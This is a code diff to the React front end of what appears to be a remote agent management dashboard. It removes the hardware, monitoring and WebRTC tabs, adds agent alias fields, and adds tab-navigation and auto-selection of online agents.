@@ -4,7 +4,6 @@ import { AgentCard } from "./components/AgentCard";
 import { StreamViewer } from "./components/StreamViewer";
 import { CommandPanel } from "./components/CommandPanel";
 import { SystemMonitor } from "./components/SystemMonitor";
-import { HardwareInventory } from "./components/HardwareInventory";
 import { ScreenshotTab } from "./components/ScreenshotTab";
 import { FileManager } from "./components/FileManager";
 import { Header } from "./components/Header";
@@ -13,15 +12,11 @@ import { SearchAndFilter } from "./components/SearchAndFilter";
 import { ActivityFeed } from "./components/ActivityFeed";
 import { UpdateClientPanel } from "./components/UpdateClientPanel";
 import { QuickActions } from "./components/QuickActions";
-import ToggleControlPanel from "./components/ToggleControlPanel";
  const SettingsLazy = lazy(() =>
    import("./components/Settings").then((mod) => ({ default: mod.Settings }))
  );
  const AboutLazy = lazy(() =>
    import("./components/About").then((mod) => ({ default: mod.About }))
- );
- const WebRTCMonitoringLazy = lazy(() =>
-   import("./components/WebRTCMonitoring").then((mod) => ({ default: mod.WebRTCMonitoring }))
  );
                                     
  import { BulkUploadManager } from "./components/bulkuploadmanager.tsx";
@@ -97,6 +92,8 @@ import {
 interface Agent {
   id: string;
   name: string;
+  alias?: string;
+  rawName?: string;
   status: "online" | "offline";
   platform: string;
   ip: string;
@@ -356,6 +353,34 @@ function AppContent() {
     "asc",
   );
 
+  useEffect(() => {
+    const onNavigateTab = (e: any) => {
+      const d = e?.detail || {};
+      const t = String(d?.tab || '');
+      if (t) setActiveTab(t);
+      const aid = typeof d?.agentId === 'string' ? d.agentId : null;
+      if (aid) setSelectedAgent(aid);
+    };
+    window.addEventListener('navigate_tab', onNavigateTab);
+    return () => {
+      window.removeEventListener('navigate_tab', onNavigateTab);
+    };
+  }, []);
+
+  useEffect(() => {
+    const firstOnline = agents.find(a => a.status === 'online') || null;
+    if (!selectedAgent && firstOnline) {
+      setSelectedAgent(firstOnline.id);
+      return;
+    }
+    if (selectedAgent) {
+      const current = agents.find(a => a.id === selectedAgent);
+      if (current && current.status !== 'online' && firstOnline && firstOnline.id !== selectedAgent) {
+        setSelectedAgent(firstOnline.id);
+      }
+    }
+  }, [agents, selectedAgent]);
+
   // Show login screen if not authenticated
   if (!authenticated) {
     return <Login />;
@@ -607,9 +632,6 @@ function AppContent() {
                   <TabsTrigger value="screenshot" className="text-xs sm:text-sm">
                     Screenshot
                   </TabsTrigger>
-                  <TabsTrigger value="hardware" className="text-xs sm:text-sm">
-                    Hardware
-                  </TabsTrigger>
                   <TabsTrigger value="virtual" className="text-xs sm:text-sm">
                     Virtual Desktop
                   </TabsTrigger>
@@ -622,12 +644,10 @@ function AppContent() {
                   <TabsTrigger value="files" className="text-xs sm:text-sm">
                     Files
                   </TabsTrigger>
-                  <TabsTrigger value="monitoring" className="text-xs sm:text-sm">
-                    Monitoring
+                  <TabsTrigger value="update_client" className="text-xs sm:text-sm">
+                    Updater
                   </TabsTrigger>
-                  <TabsTrigger value="webrtc" className="text-xs sm:text-sm">
-                    WebRTC Pro
-                  </TabsTrigger>
+                  
                 </TabsList>
                 <div className="text-xs text-muted-foreground">
                   {lastActivity?.type
@@ -1404,9 +1424,7 @@ function AppContent() {
                   <ScreenshotTab agentId={selectedAgent} />
                 </TabsContent>
 
-                <TabsContent value="hardware" className="space-y-6">
-                  <HardwareInventory agentId={selectedAgent} />
-                </TabsContent>
+                
 
                 <TabsContent value="virtual" className="space-y-6">
                   <VirtualDesktop agentId={selectedAgent} />
@@ -1486,56 +1504,9 @@ function AppContent() {
                   <UpdateClientPanel />
                 </TabsContent>
 
-                <TabsContent
-                  value="monitoring"
-                  className="space-y-6"
-                >
-                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                    <SystemMonitor />
-                    <Card>
-                      <CardHeader>
-                        <CardTitle>
-                          Network Performance
-                        </CardTitle>
-                      </CardHeader>
-                      <CardContent>
-                        <div className="space-y-4">
-                          <div className="flex justify-between items-center">
-                            <span className="text-sm">
-                              Latency
-                            </span>
-                            <Badge variant="secondary">
-                              12ms
-                            </Badge>
-                          </div>
-                          <div className="flex justify-between items-center">
-                            <span className="text-sm">
-                              Throughput
-                            </span>
-                            <Badge variant="secondary">
-                              2.4 MB/s
-                            </Badge>
-                          </div>
-                          <div className="flex justify-between items-center">
-                            <span className="text-sm">
-                              Packet Loss
-                            </span>
-                            <Badge variant="secondary">
-                              0.1%
-                            </Badge>
-                          </div>
-                        </div>
-                      </CardContent>
-                    </Card>
-                  </div>
-                  <ToggleControlPanel />
-                </TabsContent>
+                
 
-                <TabsContent value="webrtc" className="space-y-6">
-                  <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading WebRTC monitoring…</div>}>
-                    <WebRTCMonitoringLazy selectedAgent={selectedAgent} />
-                  </Suspense>
-                </TabsContent>
+                
               </Tabs>
             )}
 
